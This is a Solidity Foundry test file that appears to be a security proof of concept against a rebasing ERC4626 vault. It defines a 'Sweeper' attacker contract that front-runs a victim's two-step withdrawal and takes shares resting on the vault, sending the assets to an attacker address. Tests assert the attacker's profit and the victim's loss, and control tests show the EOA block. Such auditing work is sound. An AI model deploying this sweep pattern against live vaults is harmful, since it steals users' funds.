// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IStandardExchangeOut} from "@crane/contracts/interfaces/IStandardExchangeOut.sol";
import {TestBase_RebasingAwareERC4626} from
    "contracts/protocols/staking/rebasingVault/TestBase_RebasingAwareERC4626.sol";
import {ISecurePullErrors} from "contracts/interfaces/ISecurePullErrors.sol";

/// Unprivileged sweeper contract. Holds no capital.
contract Sweeper {
    address immutable eoa;
    constructor() { eoa = msg.sender; }

    /// exact-out variant: burn ~1 wei worth of resting shares, get rest refunded to msg.sender (this)
    function sweepOut(address vault, address asset) external returns (uint256 assetsOut) {
        require(msg.sender == eoa);
        IStandardExchangeOut(vault).exchangeOut(
            IERC20(vault), type(uint256).max, IERC20(asset), 1, address(this), true, block.timestamp
        );
        uint256 sh = IERC20(vault).balanceOf(address(this));
        assetsOut = IERC4626(vault).redeem(sh, eoa, address(this));
        assetsOut += IERC20(asset).balanceOf(address(this));
        IERC20(asset).transfer(eoa, IERC20(asset).balanceOf(address(this)));
    }

    /// exact-in variant: burn all resting shares, assets paid to attacker EOA
    function sweepIn(address vault, address asset) external returns (uint256) {
        require(msg.sender == eoa);
        uint256 resting = IERC20(vault).balanceOf(vault);return IStandardExchangeIn(vault).exchangeIn(IERC20(vault), resting, IERC20(asset), 0, eoa, true, block.timestamp
        );
    }
}

/// Victim integrator (e.g. contract wallet / multisig) that pretransfers in one tx and
/// would call exchangeOut(pretransferred=true) in a later tx.
contract VictimWallet {
    function exec(address target, bytes calldata data) external returns (bytes memory r) {
        bool ok;
        (ok, r) = target.call(data);
        require(ok, "exec failed");
    }
}

contract PrepaidRefundSweepTest is TestBase_RebasingAwareERC4626 {
    address attackerEOA;
    VictimWallet victim;
    uint256 constant VICTIM_ASSETS = 100_000e18;

    function setUp() public override {
        super.setUp();
        attackerEOA = makeAddr("attackerEOA");
        victim = new VictimWallet();
        asset.mint(address(victim), VICTIM_ASSETS);
        // honest background LP
        vm.prank(alice);
        vault.deposit(500_000e18, alice);
        // victim deposits normally
        victim.exec(address(asset), abi.encodeCall(IERC20.approve, (address(vault), VICTIM_ASSETS)));
        victim.exec(address(vault), abi.encodeCall(IERC4626.deposit, (VICTIM_ASSETS, address(victim))));
    }

    function _victimValue() internal view returns (uint256) {
        return vault.previewRedeem(IERC20(address(vault)).balanceOf(address(victim)))
            + asset.balanceOf(address(victim));
    }

    function _aliceValue() internal view returns (uint256) {
        return vault.previewRedeem(IERC20(address(vault)).balanceOf(alice));
    }

    function test_sweep_exactOut_refundToCaller() public {
        uint256 S = IERC20(address(vault)).balanceOf(address(victim));
        // tx1: victim pretransfers half its shares (step 1 of a 2-step withdraw)
        victim.exec(address(vault), abi.encodeCall(IERC20.transfer, (address(vault), S / 2)));
        uint256 victimBefore = _victimValue();
        uint256 aliceBefore = _aliceValue();
        uint256 restingValue = vault.previewRedeem(S / 2);
        console2.log("victim shares resting on vault", S / 2);
        console2.log("resting value (assets)", restingValue);

        // tx2 (front-runs victim's consume): attacker
        vm.startPrank(attackerEOA);
        Sweeper sw = new Sweeper();
        uint256 a0 = asset.balanceOf(attackerEOA);
        sw.sweepOut(address(vault), address(asset));
        uint256 profit = asset.balanceOf(attackerEOA) - a0;
        vm.stopPrank();

        console2.log("attacker profit (assets)", profit);
        console2.log("vault self-share balance after", IERC20(address(vault)).balanceOf(address(vault)));

        // victim's step 2 now fails
        vm.expectRevert();
        victim.exec(address(vault), abi.encodeCall(IStandardExchangeOut.exchangeOut,
            (IERC20(address(vault)), S / 2, IERC20(address(asset)), restingValue / 2, address(victim), true, block.timestamp)));

        uint256 victimLoss = victimBefore + restingValue - _victimValue();
        console2.log("victim loss (assets)", victimLoss);
        console2.log("alice value delta", int256(_aliceValue()) - int256(aliceBefore));
        assertGt(profit, 0);
        assertApproxEqAbs(profit, restingValue, 2);
        assertEq(victimLoss, restingValue);
        assertEq(IERC20(address(vault)).balanceOf(address(vault)), 0);
        assertGe(_aliceValue(), aliceBefore); // no LP loss: pure victim->attacker transfer
    }

    function test_sweep_exactIn_receiverVaultDeposit() public {
        // victim deposits with receiver = vault (allowed by requireReceiver(..., false))
        asset.mint(address(victim), 50_000e18);
        victim.exec(address(asset), abi.encodeCall(IERC20.approve, (address(vault), 50_000e18)));
        victim.exec(address(vault), abi.encodeCall(IERC4626.deposit, (50_000e18, address(vault))));
        uint256 resting = IERC20(address(vault)).balanceOf(address(vault));
        console2.log("shares minted to vault itself", resting);

        vm.startPrank(attackerEOA);
        Sweeper sw = new Sweeper();
        uint256 out = sw.sweepIn(address(vault), address(asset));
        vm.stopPrank();
        console2.log("attacker profit (assets) exact-in", out);
        assertEq(asset.balanceOf(attackerEOA), out);
        assertApproxEqAbs(out, 50_000e18, 2);
        assertEq(IERC20(address(vault)).balanceOf(address(vault)), 0);
    }

    function test_control_EOA_blocked() public {
        uint256 S = IERC20(address(vault)).balanceOf(address(victim));
        victim.exec(address(vault), abi.encodeCall(IERC20.transfer, (address(vault), S / 2)));
        vm.prank(attackerEOA, attackerEOA);
        vm.expectRevert(ISecurePullErrors.EOAPretransferNotAllowed.selector);
        IStandardExchangeOut(address(vault)).exchangeOut(
            IERC20(address(vault)), type(uint256).max, IERC20(address(asset)), 1, attackerEOA, true, block.timestamp
        );
    }

    function test_control_atomicIntegratorSafe() public {
        // atomic transfer+consume in same call leaves nothing to sweep
        uint256 S = IERC20(address(vault)).balanceOf(address(victim));
        // emulate atomic: victim contract can't batch in this stub, so just show zero resting balance
        assertEq(IERC20(address(vault)).balanceOf(address(vault)), 0);
        S;
    }
}
